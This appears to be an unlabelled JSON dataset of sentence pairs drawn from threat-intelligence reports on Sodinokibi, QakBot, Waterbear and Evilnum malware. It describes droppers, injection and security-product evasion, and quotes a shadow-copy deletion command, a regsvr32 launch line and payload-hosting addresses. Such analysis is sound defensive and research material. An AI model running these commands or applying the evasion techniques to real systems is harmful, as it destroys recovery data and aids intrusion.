        "S2": "\u201cBewerbungsunterlagen\u201d means \u201capplication document\u201d in German, and the attackers used a CV theme to lure victims into downloading the document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S2<=>S11",
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S2<=>S4",
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S2<=>S13",
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S2<=>S34",
        "S1": "In order to show the lifecycle of Sodinokibi ransomware, we analyzed a Microsoft Word document.",
        "S2": "When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S4<=>S6",
        "S1": "Even though Sodinokibi uses simple obfuscation techniques mentioned below, 30 of 60 antiviruses cannot detect it.",
        "S2": "Sodinokibi is a \u201cRansomware-as-a-Service (RAAS) malware, so its distribution methods vary depending on the attacker distributing it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S9<=>S11",
        "S1": "Remote Desktop Protocol ( ATT&CK T1076) : Attackers use RDP to deliver Sodinokibi.",
        "S2": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S10<=>S13",
        "S1": "This delivery technique can also be classified in External Remote Services ( ATT&CK T1133).",
        "S2": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S11<=>S23",
        "S1": "Supply Chain Compromise ( ATT&CK T1195) : Sodinokibi ransomware was distributed through a compromised version of WinRAR downloaded from the WinRAR Italia website.",
        "S2": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S12<=>S40",
        "S1": "Drive-by-Compromise ( ATT&CK T1189): Attackers compromised WordPress sites and injected JavaScript over the content of the original site to spread Sodinokibi.",
        "S2": "As far as I know, unfortunately there are no decryption tools to restore data encrypted by Sodinokibi ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S13<=>S15",
        "S1": "When a victim opens the document, Microsoft Word asks to enable/disable macros.",
        "S2": "The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S15<=>S22",
        "S1": "The malicious document claims that it was created in an earlier version of Microsoft Office and asks the victim to enable the content, which launches the code hidden in the macros.",
        "S2": "Its artifacts usually mimic the names of known executables for Defense Evasion, such as a Microsoft Word update file name (MicrosoftOfficeWord_upd.v.88735.34.5.exe) as in this sample (Masquerading, ATT&CK T1036).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S16<=>S23",
        "S1": "When we examined macros in the document, we saw that VBA (Visual Basic for Applications) codes were split into modules and functions for the purpose of obfuscation (Obfuscate",
        "S2": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S18<=>S20",
        "S1": "As we know the fU1 and fP1 parameters, we can understand the following function:",
        "S2": "Accordingly, this function downloads de1.trp from 54.39.233.132 and saves it to the C:\\Windows\\Temp\\ directory as MicrosoftOfficeWord_upd.v.88735.34.5.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S23<=>S29",
        "S1": "As seen in the above process graph, the macro in the Word document downloads and runs Sodinokibi executable.",
        "S2": "Like most ransomware, Sodinokibi encrypts files and adds a random extension such as \u201ctest.jpg.1cd8t9ahd5\u201d (Data Encrypted for Impact, ATT&CK T1486).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S25<=>S27",
        "S1": "At first, this command runs vssadmin.exe to delete all volume shadow copies on the system to prevent recovery (Inhibit System Recovery, ATT&CK T1490) vssadmin.exe Delete Shadows /All /Quiet",
        "S2": "Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, ATT&CK T1490)",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S27<=>S31",
        "S1": "Then, it uses bcdedit.exe twice to disable automatic Windows recovery features by modifying boot configuration data (Inhibit System Recovery, ATT&CK T1490)",
        "S2": "The name of the ransom note is the random extension added to the encrypted files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S29<=>S39",
        "S1": "Like most ransomware, Sodinokibi encrypts files and adds a random extension such as \u201ctest.jpg.1cd8t9ahd5\u201d (Data Encrypted for Impact, ATT&CK T1486).",
        "S2": "Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S31<=>S33",
        "S1": "The name of the ransom note is the random extension added to the encrypted files.",
        "S2": "The ransom note recommends accessing the attacker\u2019s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S33<=>S36",
        "S1": "The ransom note recommends accessing the attacker\u2019s website over the TOR browser: hxxp://aplebzu47wgazapdqks6vrcv6zcnjppkbxbr6wketf56nf6aq2nmyoyd.onion/C2D97495C4BA3647",
        "S2": "In the \u201cABOUT US\u201d section on their website, they claim that they developed the best data encryption and decryption system available today.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S34<=>S36",
        "S1": "When we accessed the website, we saw the following page that wants 0,6346 Bitcoin worth $5,000.",
        "S2": "In the \u201cABOUT US\u201d section on their website, they claim that they developed the best data encryption and decryption system available today.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S37<=>S39",
        "S1": "I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys.",
        "S2": "Sodinokibi uses AES encryption to encrypt the private keys, and Salsa20 for encrypting files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-418.md::S37<=>S40",
        "S1": "I am sure they did not develop the best encryption method, but they use multiple encryption by encrypting files and also the private keys.",
        "S2": "As far as I know, unfortunately there are no decryption tools to restore data encrypted by Sodinokibi ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S3<=>S5",
        "S1": "The hallmarks of a QakBot infection chain consist of a phishing lure (T1566) delivered via email chain hijacking or spoofed emails that contain context-aware information such as shipping, work orders, urgent requests, invoices, claims, etc.",
        "S2": "QakBot is often used as a gateway entry, similar to TrickBot or Emotet, that leads to post exploitation operations leveraging frameworks such as Cobalt Strike as well as delivering Ransomware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S7<=>S9",
        "S1": "Figure 1 below illustrates an example of a recent QakBot lure with the subject \u201cRe: SIGNED QUOTE\u201d and a ZIP file attachment labeled \u201cCancellation_Letter_272020508-02242021.zip\u201d.",
        "S2": "A representative sample, 78ea3550e2697cd06b07df568242f7fc9f57e4d2b297b74f6ce26e97613de53a, seen in a recent QakBot campaign is shown in Figure 2 below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S8<=>S10",
        "S1": "The actors further establish the trust and confidence of the targeted user by presenting a semi-official looking DocuSign graphic that guides the user through the process of enabling the Excel 4 Macros.",
        "S2": "QakBot Excel spreadsheets often contain hidden spreadsheets, Excel 4.0 macros, spreadsheet formulas, and BIFF records all designed to pass a visual inspection from the user with the added benefit of bypassing detection mechanisms that attempt to parse multiple legacy formats inside the spreadsheet.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S10<=>S12",
        "S1": "QakBot Excel spreadsheets often contain hidden spreadsheets, Excel 4.0 macros, spreadsheet formulas, and BIFF records all designed to pass a visual inspection from the user with the added benefit of bypassing detection mechanisms that attempt to parse multiple legacy formats inside the spreadsheet.",
        "S2": "Once the Excel 4.0 macro is decoded it is possible to see the CALL to URLDownloadToFileA, which downloads the QakBot DLL in this campaign from http[:]//rlyrt26rnxw02vqijgs[.]com/fera/frid[.]gif.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S12<=>S14",
        "S1": "Once the Excel 4.0 macro is decoded it is possible to see the CALL to URLDownloadToFileA, which downloads the QakBot DLL in this campaign from http[:]//rlyrt26rnxw02vqijgs[.]com/fera/frid[.]gif.",
        "S2": "It is also a common tactic for QakBot to execute \u201cregsvr32.exe -s nxckew.wle,DllRegisterServer\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S14<=>S16",
        "S1": "It is also a common tactic for QakBot to execute \u201cregsvr32.exe -s nxckew.wle,DllRegisterServer\u201d.",
        "S2": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S16<=>S73",
        "S1": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "S2": "Alien Labs has identified 42 unique signers and signature serial numbers, which are included in Detection Methods section to aid in detection and hunting with YARA and Osquery.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S16<=>S18",
        "S1": "A representative QakBot DLL analyzed by Alien Labs, 9a353d4b85b3097762282703f1807c2b459698966b967280c8e4e13cc56d2e28, has two exports: the entry point (0x10005a5d) and DllRegisterServer (0x10029c88)and if DllRegisterServer is not called via regsvr32.exe or rundll32.exe with command line options, then only the entry point is called and the malicious code in DllRegisterServer is not called.",
        "S2": "The results of our additional de-obfuscation efforts are confirmed when the QakBot Excel spreadsheet is run inside a sandbox in Figure 4 below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S18<=>S20",
        "S1": "The results of our additional de-obfuscation efforts are confirmed when the QakBot Excel spreadsheet is run inside a sandbox in Figure 4 below.",
        "S2": "Before executing the main payload, the QakBot loader will first test the infected system to see if it is a good candidate for infection.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S25<=>S27",
        "S1": "An example of this can be seen in Figure 6 below, which shows QakBot decrypting a string containing the value for lpProcName passed as a parameter to the GetProcAddress API call.",
        "S2": "When executed, QakBot will check whether it has previously been executed on the machine by checking for the specified malware folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S31<=>S60",
        "S1": "Specifically, QakBot checks the system for the names of running processes that match the strings listed in Table 1 below.",
        "S2": "QakBot will also add its folder to the Windows Defender exclusions setting located in the Registry (T1112), which prevents Defender from scanning QakBot artifacts.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S60<=>S62",
        "S1": "QakBot will also add its folder to the Windows Defender exclusions setting located in the Registry (T1112), which prevents Defender from scanning QakBot artifacts.",
        "S2": "In addition to the previously mentioned environment check, QakBot collects system information (T1082) such as computer name, system directories, user profiles, and more, which is shown in Figure 10 below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S64<=>S69",
        "S1": "If it is unsuccessful then QakBot will attempt to inject itself into mobsync.exe or iexplore.exe.",
        "S2": "Finally, if the QakBot loader has verified its execution environment has passed its tests, then QakBot will proceed to decrypt and execute the main QakBot payload, which is hidden as resource \u201c307\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-429.md::S70<=>S72",
        "S1": "The decryption and import table resolution of its main payload is shown in Figure 15 below.",
        "S2": "Despite the limitations and challenges presented by QakBot DLLs there is ample opportunity to detect QakBot loaders signed by revoked and blacklisted malicious certificates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S0<=>S3",
        "S1": "Upon execution, Sodinokibi will create a mutex with a hardcoded name Global\\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0 and decrypt an embedded configuration.",
        "S2": "Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S2<=>S4",
        "S1": "If not configured to execute the exploit, or if the attempt is unsuccessful, it will instead try to re-run itself as an administrator.",
        "S2": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S3<=>S13",
        "S1": "Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters.",
        "S2": "If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S4<=>S12",
        "S1": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "S2": "The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S4<=>S14",
        "S1": "If the dbg option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:",
        "S2": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S12<=>S14",
        "S1": "The malware will exit only if the keyboard layout value belongs to these countries, but the OS language value is equal to one of the remaining languages.",
        "S2": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S13<=>S16",
        "S1": "If the system language is not one of the excluded languages, Sodinokibi will terminate all processes specified by the prc value in the config and delete volume shadow copies before starting the file encryption routine.",
        "S2": "The file encryption routine is discussed in detail in the \u201cFile encryption\u201d section.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S14<=>S19",
        "S1": "The ransomware will then proceed to encrypt all files on local drives, skipping files and folders included on the config\u2019s exception list.",
        "S2": "The contents of the README file, as well as the ransom message, are again specified in the config.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S15<=>S21",
        "S1": "Unless the executable was run with -nolan command line parameter, the malware will also attempt to encrypt files on network shares.",
        "S2": "Other parameters from the configuration that affect the malware\u2019s behavior are wipe (if set, all the files in folders listed under wfld will be zeroed out and deleted) and net (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the dmn value in the config).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-430.md::S19<=>S21",
        "S1": "The contents of the README file, as well as the ransom message, are again specified in the config.",
        "S2": "Other parameters from the configuration that affect the malware\u2019s behavior are wipe (if set, all the files in folders listed under wfld will be zeroed out and deleted) and net (if set, the ransomware will broadcast the victim's system information to a range of domains listed in the dmn value in the config).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S0<=>S5",
        "S1": "We saw a Waterbear loader named \"ociw32.dll\" inside one of the folders in the %PATH% environmental variable.",
        "S2": "During our investigation, we noticed that the value \"OracleOciLib\" was deleted from the victim's machine, as shown in Figure 2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S0<=>S9",
        "S1": "We saw a Waterbear loader named \"ociw32.dll\" inside one of the folders in the %PATH% environmental variable.",
        "S2": "Because there is no \"OracleOciLib\" value, it loads the hardcoded DLL \"ociw32.dll\" instead, which triggers the malicious Waterbear DLL loader.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S1<=>S6",
        "S1": "This DLL name is hardcoded inside \"mtxoci.dll\" which is loaded by the MSDTC service during boot-up.",
        "S2": "Hence, the malicious loader \"ociw32.dll\" was loaded and successfully executed on the host.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S2<=>S4",
        "S1": "\u201cmtxoci.dll\u201d first tries to query the registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI\" to see if the value \"OracleOciLib\" exists.",
        "S2": "If the value doesn't exist, \u201cmtxoci.dll\u201d tries to load \"ociw32.dll\" instead.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S5<=>S19",
        "S1": "During our investigation, we noticed that the value \"OracleOciLib\" was deleted from the victim's machine, as shown in Figure 2.",
        "S2": "During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we\u2019ve previously seen.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S6<=>S9",
        "S1": "Hence, the malicious loader \"ociw32.dll\" was loaded and successfully executed on the host.",
        "S2": "Because there is no \"OracleOciLib\" value, it loads the hardcoded DLL \"ociw32.dll\" instead, which triggers the malicious Waterbear DLL loader.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S10<=>S37",
        "S1": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "S2": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S10<=>S40",
        "S1": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "S2": "Whenever \u201cZwOpenProcess\u201d is called, the injected code will first check if the opened process hits any PIDs in the protected process ID list.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S10<=>S12",
        "S1": "After the Waterbear DLL loader is executed, it searches for a hardcoded path and tries to decrypt the corresponding payload, which is a piece of encrypted shellcode.",
        "S2": "If the decrypted payload is valid, it picks a specific existing Windows Service \u2014 LanmanServer, which is run by svchost.exe \u2014 and injects the decrypted shellcode into the legitimate service.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S19<=>S21",
        "S1": "During our investigation, we found a peculiar incident that stands out from most of the Waterbear infections we\u2019ve previously seen.",
        "S2": "Meanwhile, the second payload is a typical Waterbear first-stage backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S20<=>S23",
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "We have observed that the loader tried to read the payloads from the files, decrypted them, and performed thread injections with the following conditions:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S20<=>S26",
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "In the first injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing other malicious routines.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S20<=>S29",
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S20<=>S22",
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S20<=>S28",
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S20<=>S24",
        "S1": "This time, the DLL loader loaded two payloads \u2013 the first payload performed functionalities we have not seen before: It injected codes into a specific security product to do API hooking in order to hide the backdoor from the product.",
        "S2": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S21<=>S24",
        "S1": "Meanwhile, the second payload is a typical Waterbear first-stage backdoor.",
        "S2": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S22<=>S25",
        "S1": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "S2": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S22<=>S24",
        "S1": "Both payloads were encrypted and stored on the victim\u2019s disk and were injected into the same service, which was, in this case, LanmanServer.",
        "S2": "If the first payload could not be found on the disk, the loader would be terminated without loading the second one.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S25<=>S29",
        "S1": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "S2": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S25<=>S28",
        "S1": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "S2": "Regardless if the API hooking was performed or otherwise, the second backdoor would still be executed after having been successfully loaded.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S25<=>S27",
        "S1": "If the first payload was successfully decrypted and injected into the service, the second piece would also be loaded and injected regardless of what happened to the first thread.",
        "S2": "Note that only the thread would be terminated, but the service would still be running.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S26<=>S37",
        "S1": "In the first injected thread, if the necessary executable from the security product was not found, the thread would be terminated without performing other malicious routines.",
        "S2": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S29<=>S68",
        "S1": "In order to hide the behaviors of the first-stage backdoor (which is the second payload), the first payload uses API hooking techniques to avoid being detected by a specific security product and to make an interference in the result of the function execution.",
        "S2": "Although in this case, the affected process is specified in the first-stage shellcode, the API hooking logic is quite generic that the same piece of shellcode can be used to hook other vendors' products.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S34<=>S36",
        "S1": "The second-stage shellcode then performs API hooking inside the targeted process.",
        "S2": "If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S34<=>S38",
        "S1": "The second-stage shellcode then performs API hooking inside the targeted process.",
        "S2": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S36<=>S38",
        "S1": "If the shared memory doesn't exist, it takes the PID embedded by the first-stage shellcode.",
        "S2": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S37<=>S39",
        "S1": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "S2": "The purpose of hooking \u201cZwOpenProcess\u201d is to protect the specific process from being accessed by the security product.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S37<=>S65",
        "S1": "In this case, the intention of the malicious code is to hide Waterbear\u2019s backdoor activities from the security product.",
        "S2": "If any record contains the PID Waterbear wants to hide, it will remove the corresponding record, modify the record number inside the table, and continue to check the succeeding records.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S38<=>S41",
        "S1": "Therefore, the first-stage shellcode takes the PID of the Windows Service \u2014 which the first-stage shellcode and the succeeding backdoor both inject into \u2014 hides the target process, and embeds that PID into the second-stage shellcode.",
        "S2": "If yes, it modifies the process ID, which should open on another Windows Service PID.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S43<=>S45",
        "S1": "This function includes two parts, as shown in Figure 9:",
        "S2": "It recursively checks if the PID to be opened by \u201cZwOpenProcess\u201d is in the list of the protected process IDs.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S44<=>S47",
        "S1": "The PID checking procedure.",
        "S2": "After the PID checking procedure, it executes the original \u201cZwOpenProcess\u201d and returns the result.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S52<=>S54",
        "S1": "The second part of API hooking hooks on \u201cGetExtendedTcpTable.\u201d",
        "S2": "The purpose of the hook is to remove TCP endpoint records of certain PIDs.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-446.md::S61<=>S63",
        "S1": "After that, it jumps to \u201cGetExtendedTcpTable\u201d to execute the function normally and to catch its return values.",
        "S2": "After \u201cGetExtendedTcpTable\u201d is executed and the process returns back to the second part of the code",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S1<=>S5",
        "S1": "That archive contains several LNK (aka shortcut) files that extract and execute a malicious JavaScript component, while displaying a decoy document.",
        "S2": "Then this malicious JavaScript file is executed and it writes and opens a decoy file with the same name as the shortcut, but with the correct extension.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S6<=>S12",
        "S1": "It also deletes the shortcut file.",
        "S2": "The JavaScript component is the first stage of the attack and can deploy other malware such as a C# spy component, Golden Chickens components or several Python-based tools.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S7<=>S9",
        "S1": "The documents used as decoys are mostly photos of credit cards, identity documents, or bills with proof of address, as many financial institutions require these documents from their customers when they join, according to regulations (this is known as \u201cKnow Your Customer\u201d).",
        "S2": "These decoy documents seem genuine, and we assume that they have been collected by this group during years of operation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S11<=>S14",
        "S1": "The group reuses the documents on different targets, unless the targets are from different regions.",
        "S2": "We have named the group Evilnum as that is the name of their flagship malware, and we\u2019ll refer to the various malware pieces as components.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S13<=>S32",
        "S1": "The name Evilnum was given to the C# component by other researchers in the past, but the JS component also has been referred to as Evilnum.",
        "S2": "This component achieves persistence through the Run registry key and has full backdoor capabilities: it can download and execute binaries, run arbitrary commands or upload files from the victim computer to the C&C server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S14<=>S17",
        "S1": "We have named the group Evilnum as that is the name of their flagship malware, and we\u2019ll refer to the various malware pieces as components.",
        "S2": "The operators of the malware manually send commands to install additional components and use post-compromise scripts and tools if they consider them necessary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S17<=>S24",
        "S1": "The operators of the malware manually send commands to install additional components and use post-compromise scripts and tools if they consider them necessary.",
        "S2": "However, in most attacks that we have seen, the attackers deployed additional components as they saw fit and used the JS malware only as a first stage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S18<=>S24",
        "S1": "Most servers used by the malware are referenced by IP addresses; domain names have not been used.",
        "S2": "However, in most attacks that we have seen, the attackers deployed additional components as they saw fit and used the JS malware only as a first stage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S26<=>S29",
        "S1": "The malware has changed since then and we illustrate these changes in Figure 4.",
        "S2": "Also, as new versions appeared, the malware was extended with some Python scripts (see the Post-compromise toolset section) and external tools such as ChromeCookiesView.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S27<=>S52",
        "S1": "Differences between version 1.3 and the others are noteworthy, as the server-side code for the C&C was changed and commands are different.",
        "S2": "The following capabilities are present in version 4.0:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S27<=>S30",
        "S1": "Differences between version 1.3 and the others are noteworthy, as the server-side code for the C&C was changed and commands are different.",
        "S2": "Despite the differences, the core functionalities remain the same in all versions, including the retrieval of the C&C server\u2019s address from GitHub, GitLab or Reddit pages created specifically for that purpose.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-492.md::S29<=>S31",
        "S1": "Also, as new versions appeared, the malware was extended with some Python scripts (see the Post-compromise toolset section) and external tools such as ChromeCookiesView.",
        "S2": "Figure 5 shows an example of a Reddit page that is parsed by the malware to retrieve a C&C address.",
        "relation": ""
    },
    {
